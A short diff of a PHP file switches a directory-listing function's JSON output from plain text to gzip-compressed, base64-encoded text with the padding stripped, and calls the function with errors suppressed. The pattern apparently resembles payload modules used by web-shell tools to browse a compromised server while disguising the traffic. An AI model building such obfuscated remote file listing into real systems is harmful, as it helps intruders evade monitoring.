@@ -158,8 +158,8 @@ function LIST_DIRECTORY()
             ]
         ], JSON_UNESCAPED_UNICODE);
 
-    // echo trim(base64_encode(gzdeflate($response, $level)), '=');
-    echo $response;
+    echo trim(base64_encode(gzdeflate($response, $level)), '=');
+    // echo $response;
 }
 
 @LIST_DIRECTORY();
